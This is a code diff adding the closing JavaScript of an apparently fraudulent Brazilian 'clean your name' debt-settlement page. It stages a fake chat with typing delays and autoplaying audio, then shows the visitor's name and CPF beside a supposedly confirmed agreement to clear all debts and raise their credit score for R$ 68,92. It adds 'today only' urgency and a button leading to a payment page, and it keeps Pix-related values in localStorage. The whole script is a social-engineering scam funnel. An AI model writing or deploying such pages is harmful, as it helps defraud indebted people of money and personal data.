+                                                  t.remove();
+                                                  var w=document.createElement('div');w.className='continue-wrap';
+                                                  w.innerHTML='<button class="btn-continue" id="b-cont2">CONTINUAR</button>';
+                                                  chat.appendChild(w);scrollDown();
+                                                  document.getElementById('b-cont2').onclick=function(){
+                                                    var c2=this.closest('.continue-wrap');if(c2)c2.style.display='none';
+                                                    (async function(){
+                                                      var u=document.createElement('div');u.className='msg-row user';
+                                                      u.innerHTML='<div class="bubble user">CONTINUAR</div>';
+                                                      chat.appendChild(u);scrollDown();
+                                                      await new Promise(function(res){
+                                                        var t=showTyping();
+                                                        setTimeout(function(){
+                                                          t.remove();
+                                                          var row=document.createElement('div');row.className='audio-row';
+                                                          row.innerHTML='<img class="av" src="'+AV+'" style="width:32px;height:32px;border-radius:50%;object-fit:cover;flex-shrink:0"/>'+
+                                                          '<div class="audio-bubble"><button class="audio-play" aria-label="Ouvir"><svg class="play-ic" width="20" height="20" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg><svg class="pause-ic" width="20" height="20" viewBox="0 0 24 24"><path d="M6 5h4v14H6zM14 5h4v14h-4z"/></svg></button>'+
+                                                          '<div class="audio-meta"><div class="audio-bar"><div class="audio-fill"></div></div><div class="audio-time">0:00 / 0:29</div></div>'+
+                                                          '<audio src="../audio/audio-4.mp3" preload="auto" autoplay></audio></div>';
+                                                          chat.appendChild(row);scrollDown();
+                                                          var audio=row.querySelector('audio'),btn=row.querySelector('.audio-play'),
+                                                              fill=row.querySelector('.audio-fill'),time=row.querySelector('.audio-time');
+                                                          function fmt(s){if(!isFinite(s))return '0:00';s=Math.floor(s);return Math.floor(s/60)+':'+('0'+(s%60)).slice(-2);}
+                                                          audio.onloadedmetadata=function(){time.textContent='0:00 / '+fmt(audio.duration);};
+                                                          audio.ontimeupdate=function(){var p=audio.duration?audio.currentTime/audio.duration*100:0;fill.style.width=p+'%';time.textContent=fmt(audio.currentTime)+' / '+fmt(audio.duration);};
+                                                          audio.onended=function(){btn.classList.remove('playing');fill.style.width='0%';};
+                                                          btn.onclick=function(){if(audio.paused){audio.play();btn.classList.add('playing');}else{audio.pause();btn.classList.remove('playing');}};
+                                          audio.onplaying=function(){btn.classList.add('playing');};
+                                          try{var ap=audio.play();if(ap&&ap.catch)ap.catch(function(){});}catch(e){}
+                                                          setTimeout(res,400);
+                                                        },3000);
+                                                      });
+                                                      await new Promise(function(res){
+                                                        var t=showTyping();
+                                                        setTimeout(function(){t.remove();res();},30000);
+                                                      });
+                                                      await new Promise(function(res){
+                                                        var t=showTyping();
+                                                        setTimeout(function(){
+                                                          t.remove();
+                                                          var row=document.createElement('div');row.className='msg-row';
+                                                          row.innerHTML='<img class="av" src="'+AV+'"/><div class="status-box"><div class="lbl">Acordo confirmado: '+ACORDO+'!</div><div class="lbl">Beneficiário(a):</div><div class="neg">'+full+'</div><div class="lbl">Identificação (CPF):</div><div class="neg">'+fmtCpf(cpfRaw)+'</div><div class="cpf">Quitação de todas as dívidas em ativo no CPF.</div><div class="neg">895 Pontos no score.</div><div class="lbl">Valor da proposta: R$ 68,92</div></div>';
+                                                          chat.appendChild(row);scrollDown();
+                                                          setTimeout(res,400);
+                                                        },3000);
+                                                      });
+                                                      await new Promise(function(res){
+                                                        var t=showTyping();
+                                                        setTimeout(function(){
+                                                          t.remove();
+                                                          var w=document.createElement('div');w.className='continue-wrap';
+                                                          w.innerHTML='<button class="btn-continue" id="b-pay">CONTINUAR PARA O PAGAMENTO</button>';
+                                                          chat.appendChild(w);scrollDown();
+                                                          document.getElementById('b-pay').onclick=function(){
+                                                            var bp=this.closest('.continue-wrap');if(bp)bp.style.display='none';
+                                                            (async function(){
+                                                              var u=document.createElement('div');u.className='msg-row user';
+                                                              u.innerHTML='<div class="bubble user">CONTINUAR PARA O PAGAMENTO</div>';
+                                                              chat.appendChild(u);scrollDown();
+                                                              await new Promise(function(res){
+                                                                var t=showTyping();
+                                                                setTimeout(function(){
+                                                                  t.remove();
+                                                                  var row=document.createElement('div');row.className='audio-row';
+                                                                  row.innerHTML='<img class="av" src="'+AV+'" style="width:32px;height:32px;border-radius:50%;object-fit:cover;flex-shrink:0"/>'+
+                                                                  '<div class="audio-bubble"><button class="audio-play" aria-label="Ouvir"><svg class="play-ic" width="20" height="20" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg><svg class="pause-ic" width="20" height="20" viewBox="0 0 24 24"><path d="M6 5h4v14H6zM14 5h4v14h-4z"/></svg></button>'+
+                                                                  '<div class="audio-meta"><div class="audio-bar"><div class="audio-fill"></div></div><div class="audio-time">0:00 / 0:29</div></div>'+
+                                                                  '<audio src="../audio/audio-5.mp3" preload="auto" autoplay></audio></div>';
+                                                                  chat.appendChild(row);scrollDown();
+                                                                  var audio=row.querySelector('audio'),btn=row.querySelector('.audio-play'),
+                                                                      fill=row.querySelector('.audio-fill'),time=row.querySelector('.audio-time');
+                                                                  function fmt(s){if(!isFinite(s))return '0:00';s=Math.floor(s);return Math.floor(s/60)+':'+('0'+(s%60)).slice(-2);}
+                                                                  audio.onloadedmetadata=function(){time.textContent='0:00 / '+fmt(audio.duration);};
+                                                                  audio.ontimeupdate=function(){var p=audio.duration?audio.currentTime/audio.duration*100:0;fill.style.width=p+'%';time.textContent=fmt(audio.currentTime)+' / '+fmt(audio.duration);};
+                                                                  audio.onended=function(){btn.classList.remove('playing');fill.style.width='0%';};
+                                                                  btn.onclick=function(){if(audio.paused){audio.play();btn.classList.add('playing');}else{audio.pause();btn.classList.remove('playing');}};
+                                          audio.onplaying=function(){btn.classList.add('playing');};
+                                          try{var ap=audio.play();if(ap&&ap.catch)ap.catch(function(){});}catch(e){}
+                                                                  setTimeout(res,400);
+                                                                },3000);
+                                                              });
+                                                              await new Promise(function(res){
+                                                                var t=showTyping();
+                                                                setTimeout(function(){t.remove();res();},30000);
+                                                              });
+                              await step('<b>Atenção:</b> Oferta válida somente <b>hoje ('+DATA_HOJE+')</b>.<br><br>'+URG_CORE);
+                              await step('<i>Clique no botão abaixo para concluir a regularização do seu CPF e realizar o pagamento do acordo.</i>');
+                              await new Promise(function(res){
+                                var t=showTyping();
+                                setTimeout(function(){
+                                  t.remove();
+                                  var w=document.createElement('div');
+                                  w.innerHTML='<button class="btn-pay-full" id="b-pay2">REALIZAR PAGAMENTO DO ACORDO E LIMPAR MEU NOME</button>';
+                                                                  chat.appendChild(w);scrollDown();
+                                                                  document.getElementById('b-pay2').onclick=function(){window.location.href=(window.__withParams?window.__withParams('../pagamento/'):'../pagamento/');};
+                                                                  res();
+                                                                },3000);
+                                                              });
+                                                            })();
+                                                          };
+                                                          res();
+                                                        },3000);
+                                                      });
+                                                    })();
+                                                  };
+                                                  res();
+                                                },3000);
+                                              });
+                                            })();
+                                          };
+                                          res();
+                                        },3000);
+                                      });
+                                    })();
+                                  };
+                                  res();
+                                },3000);
+                              });
+                            })();
+                          };
+                          res();
+                        },3000);
+                      });
+                    })();
+                  };
+                  res();
+                },3000);
+              });
+            })();
+          };
+          res();
+        },3000);
+      });
+    })();
+  };
+  document.getElementById('b-no').onclick=function(){
+    var btns=document.querySelector('.btns');if(btns)btns.style.display='none';
+    (async function(){
+      var u=document.createElement('div');u.className='msg-row user';
+      u.innerHTML='<div class="bubble user">Não sou eu</div>';
+      chat.appendChild(u);scrollDown();
+      await step('Por favor, insira seu CPF corretamente no site!');
+      setTimeout(function(){try{['sr_consulta','sr_cpf','sr_nome','sr_confirmado','sr_pix','sr_pago','sr_taxa','sr_taxa_pix'].forEach(function(k){localStorage.removeItem(k);});}catch(e){}window.location.href=(window.__withParams?window.__withParams('../cpf/'):'../cpf/');},5000);
+    })();
+  };
+})();
+</script>
+</body>
+</html>
